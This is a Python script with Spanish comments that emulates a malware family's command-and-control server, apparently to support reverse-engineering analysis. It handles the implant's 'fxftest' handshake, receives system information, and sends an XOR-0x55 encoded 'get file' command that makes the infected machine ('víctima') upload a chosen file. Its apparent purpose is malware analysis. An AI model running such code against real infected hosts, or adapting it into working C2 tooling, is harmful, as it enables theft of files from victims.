#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket, struct, binascii, datetime, os

HOST = ''          # 0.0.0.0
PORT = 443
RECV_SZ = 65535
TIMEOUT_S = 60

# --- AJUSTA ESTAS RUTAS ---
PATH_TO_FETCH  = r"C:\Users\usuario\Desktop\prueba.txt"         # para opcode 6
# --------------------------

def hexdump(b: bytes) -> str:
    hx = binascii.hexlify(b).decode()
    return ' '.join(hx[i:i+2] for i in range(0, len(hx), 2))

def safe_ascii(b: bytes) -> bytes:
    return bytes(ch if 32 <= ch < 127 else 0x2E for ch in b)

def xor55(data: bytes) -> bytes:
    return bytes((x ^ 0x55) for x in data)

def make_handshake_reply() -> bytes:
    return b"fxftest\x00"  # eco de 8 bytes (compara los 7 primeros)

def make_opcode6_packet(path_clear: str) -> bytes:
    # FUN_00402210 espera 256 bytes XOR 0x55 con la ruta del fichero
    p = path_clear.encode('ascii', errors='ignore') + b"\x00"
    if len(p) > 256:
        p = p[:256]
        if p[-1] != 0:
            p = p[:-1] + b"\x00"
    else:
        p = p + b"\x00" * (256 - len(p))
    p_xor = xor55(p)
    pkt = struct.pack("<I", 6) + p_xor           # 4 + 256 = 0x104
    assert len(pkt) == 0x104
    return pkt

def recv_exact(sock: socket.socket, n: int) -> bytes:
    """Recibe exactamente n bytes o lanza excepción."""
    chunks = []
    remain = n
    while remain > 0:
        chunk = sock.recv(remain)
        if not chunk:
            raise RuntimeError(f"Conexión cerrada con {remain} bytes pendientes")
        chunks.append(chunk)
        remain -= len(chunk)
    return b''.join(chunks)

def recv_to_file(sock: socket.socket, n: int, dst_path: str) -> None:
    """Recibe exactamente n bytes y los guarda en dst_path (streaming)."""
    with open(dst_path, "wb") as f:
        remain = n
        while remain > 0:
            chunk = sock.recv(min(0x4000, remain))
            if not chunk:
                raise RuntimeError(f"Conexión cerrada con {remain} bytes pendientes (file)")
            f.write(chunk)
            remain -= len(chunk)

def run_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(5)
    print(f"[*] Escuchando en 0.0.0.0:{PORT}")

    while True:
        c, addr = s.accept()
        ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"\n[+] {ts} Conexión de {addr[0]}:{addr[1]}")
        c.settimeout(TIMEOUT_S)
        try:
            # 1) HELLO
            data = c.recv(RECV_SZ)
            print(f"[RX {len(data)} B] ASCII={safe_ascii(data)!r}\nHEX = {hexdump(data)}")
            if b"fxftest" not in data:
                print("[!] No llegó el hello esperado.")
                c.close()
                continue
            c.sendall(make_handshake_reply())
            print("[TX handshake 8 B]")

            # 2) SYSINFO (~512 B)
            data = c.recv(RECV_SZ)
            print(f"[RX {len(data)} B] ASCII={safe_ascii(data)!r}\nHEX = {hexdump(data)}")


            # ---------- OPCODE 6: Enviar ruta XOReada y recibir archivo ----------
            pkt6 = make_opcode6_packet(PATH_TO_FETCH)
            c.sendall(pkt6)
            print(f"[TX opcode6=GetFile 0x104 B] path={PATH_TO_FETCH!r}")

            # 6.1) Recibir header 0x204
            hdr = recv_exact(c, 0x204)
            print(f"[RX header 0x204 B] HEX={hexdump(hdr[:64])} ...")
            # Los primeros 0x200 van XOR 0x55; los últimos 4 bytes son el tamaño
            size = struct.unpack("<I", hdr[0x200:0x204])[0]
            print(f"[i] Tamaño anunciado por la víctima: {size} bytes")

            # 6.2) Recibir fichero completo
            local_name = os.path.basename(PATH_TO_FETCH)
            dst_path = f"./recv_{local_name}"
            recv_to_file(c, size, dst_path)
            print(f"[RX data {size} B] Guardado en: {dst_path}")

        except socket.timeout:
            print("[!] Timeout de socket.")
        except Exception as e:
            print(f"[!] Error: {e}")
        finally:
            try:
                c.shutdown(socket.SHUT_RDWR)
            except Exception:
                pass
            c.close()
            print("[*] Conexión cerrada.")

if __name__ == "__main__":
    run_server()
